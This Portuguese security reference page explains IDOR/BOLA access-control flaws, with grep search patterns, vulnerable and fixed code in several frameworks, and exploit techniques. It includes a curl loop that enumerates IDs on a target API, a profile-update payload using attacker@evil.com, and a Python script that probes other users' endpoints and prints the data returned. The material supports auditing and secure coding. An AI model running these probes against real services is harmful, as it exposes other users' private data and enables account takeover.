# IDOR & BOLA  Broken Object Level Authorization

**Tags:** #alto #idor #bola #acesso-nao-autorizado #api #controle-de-acesso
**OWASP:** A01:2021  Broken Access Control / API1:2023  BOLA
**CVSS Base:** 7.5 (Alto  acesso a dados de outros usuários sem autenticação)

---

## 📖 O que é

**IDOR (Insecure Direct Object Reference):** referências a objetos internos (IDs de banco, nomes de arquivo) são expostas e manipuláveis pelo usuário, sem verificação de propriedade.

**BOLA (Broken Object Level Authorization):** a versão moderna do IDOR para arquiteturas REST stateless. O auth token prova *quem* é o usuário, mas a camada de dados não valida se o ID acessado pertence ao usuário autenticado.

É a **vulnerabilidade #1 em APIs REST** segundo o OWASP API Security Top 10.

---

## 🔍 `grep_search` Táticas

```
req.params.id
req.params.userId
[FromRoute] int id
$_GET['id']
getById(
findById(
findOne({_id:
WHERE id =
params['id']
params[:id]
```

**O que buscar:** a instrução imediatamente após a extração do ID.  
Se invocar `findById(id)` sem cruzar com `Session.UserID` ou sem uma Policy/Guard  **vulnerabilidade confirmada**.

---

## 🎯 Contextos de Alto Risco

| Endpoint | Risco |
|---|---|
| `GET /api/orders/{id}` | Visualizar pedidos de outros usuários |
| `GET /api/users/{id}/profile` | Acessar perfis privados |
| `PUT /api/users/{id}/password` | Alterar senha de outro usuário |
| `DELETE /api/posts/{id}` | Deletar conteúdo alheio |
| `GET /api/invoices/{id}/download` | Baixar faturas de outras contas |
| `GET /api/messages/{threadId}` | Ler mensagens privadas alheias |

---

## 💣 Padrões Vulneráveis

```python
#  VULNERÁVEL  Flask
@app.get('/api/orders/<int:order_id>')
def get_order(order_id):
    order = Order.query.get(order_id)  # pega qualquer pedido pelo ID
    # Nenhuma verificação de propriedade!
    return jsonify(order.to_dict())
```

```javascript
//  VULNERÁVEL  Express
app.get('/api/users/:id/documents', async (req, res) => {
    const docs = await Document.find({ userId: req.params.id });
    // req.params.id vem do URL  controlado pelo atacante
    // Não verifica se req.user.id === req.params.id
    res.json(docs);
});
```

```csharp
//  VULNERÁVEL  ASP.NET
[HttpGet("/api/invoices/{id}")]
public IActionResult GetInvoice([FromRoute] int id)
{
    var invoice = _db.Invoices.Find(id);
    // Não verifica se invoice.UserId == currentUser.Id
    return Ok(invoice);
}
```

---

##  Padrões Corretos

```python
#  CORRETO  Flask com verificação de propriedade
@app.get('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id  # filtra pelo usuário ATUAL, não pelo parâmetro
    ).first_or_404()
    return jsonify(order.to_dict())
```

```javascript
//  CORRETO  Express
app.get('/api/users/:id/documents', async (req, res) => {
    // Verificar que o usuário autenticado é dono do recurso
    if (req.user.id !== parseInt(req.params.id) && !req.user.isAdmin) {
        return res.status(403).json({ error: 'Acesso negado' });
    }
    const docs = await Document.find({ userId: req.params.id });
    res.json(docs);
});
```

```python
#  CORRETO  Django
def get_document(request, doc_id):
    doc = get_object_or_404(Document, id=doc_id, owner=request.user)
    # Django levanta 404 se não encontrar (sem vazar que existe mas não é do user)
    return JsonResponse(doc.to_dict())
```

---

## 💣 Técnicas de Exploit

### Enumeração Sequencial de IDs
```bash
# Brute force sequencial  IDs numéricos são enumeráveis
for i in {1..1000}; do
    curl -s -H "Authorization: Bearer $MY_TOKEN" \
    "http://target.com/api/orders/$i" | grep -v "Acesso Negado"
done
```

### Troca de ID em Requests
```bash
# Meu pedido é o #1337  tentando acessar o #1
GET /api/orders/1 HTTP/1.1
Authorization: Bearer <meu_token>
#  Se retornar dados de outro usuário = IDOR confirmado
```

### IDOR em Parâmetros Escondidos
```bash
# Referências não apenas em path, mas em body/query também
POST /api/update-profile
{"user_id": 1, "email": "attacker@evil.com"}
#                trocar para o ID de outro usuário
```

### UUIDs não resolvem IDOR
```
# UUIDs reduzem enumeração, mas não eliminam IDOR
# Se um UUID é exposto em uma resposta da API  pode ser acessado fora de contexto
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
# Se não há verificação de propriedade, UUID não protege
```

---

## 🧪 Script de Teste

```python
# .tmp/validate_idor.py
import requests

TARGET = "http://target.com"
MY_TOKEN = "eyJ..."           # Seu token de autenticação
MY_USER_ID = 42               # Seu próprio ID de usuário
TEST_USER_ID = 1              # Testar acesso ao usuário admin/outro

ENDPOINTS_TO_TEST = [
    f"/api/users/{TEST_USER_ID}",
    f"/api/users/{TEST_USER_ID}/orders",
    f"/api/users/{TEST_USER_ID}/documents",
    f"/api/invoices/{TEST_USER_ID}",
]

headers = {"Authorization": f"Bearer {MY_TOKEN}"}

for ep in ENDPOINTS_TO_TEST:
    r = requests.get(f"{TARGET}{ep}", headers=headers, timeout=5)
    if r.status_code == 200:
        print(f"[IDOR CONFIRMADO] {ep}")
        print(f"  Dados: {r.text[:200]}")
    else:
        print(f"[bloqueado] {ep} (status: {r.status_code})")
```

---

## 🔗 Chain Exploits

```
IDOR em /users/{id}/password  Reset de senha de qualquer usuário  Account Takeover
IDOR em /admin/{id}  Acesso ao painel administrativo sem ser admin
IDOR + Mass Assignment  Atualizar role de outro usuário para admin
IDOR em endpoint de fatura + PII  Violação de LGPD/GDPR com dados de terceiros
IDOR em mensagens privadas  Espionagem corporativa
```

---

## 📌 Referências
- [[business-logic-flaws]]
- [[mass-assignment]]
- [[autenticacao-gestao-de-sessao]]
- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
